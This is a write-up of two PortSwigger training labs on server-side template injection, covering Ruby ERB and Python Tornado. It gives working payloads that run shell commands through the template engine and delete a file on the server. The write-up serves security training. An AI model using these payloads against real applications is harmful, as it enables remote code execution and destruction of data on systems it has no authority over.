## Basic SSTI
[Basic SSTI](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

Write-up:

1. When we click the first product, we see the message "Unfortunately this product is out of stock."
If we change the message parameter to `<%= 7*7 %>`, we see that it returns 49 - ERB injection possibility.

2. Changing the message parameter to `<%= system 'ls' %>` shows us the **morale.txt** file.
   
3. We can use `<%= system 'rm morale.txt' %>` to solve the lab.

## Basic SSTI (code context)
[Basic SSTI (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

Write-up:

1. After logging in, we see there are two actions in our account - changing e-mail and preferred name.
Analyzing both these requests shows us that changing preferred name has an interesting parameter that changes our name display in post comments. For example, changing preferred name to name uses parameter `blog-post-author-display=user.name`.

2. After studying the Tornado docs, we see that its template expressions are surrounded by curly braces, so we can use these to escape and execute code: <br>
    `blog-post-author-display=user.name}}{{7*7}}` <br>
    This shows us 49, which points to code being executed.

3. Using {% %} to execute arbitrary code, we can craft the following payload: <br>
    `blog-post-author-display=user.name}}{%25%20import%20os%20%25}{{os.system('rm%20/home/carlos/morale.txt')}}` <br>
    URL-encoding the necessary characters (spaces - %20 and % - %25). This solves the lab.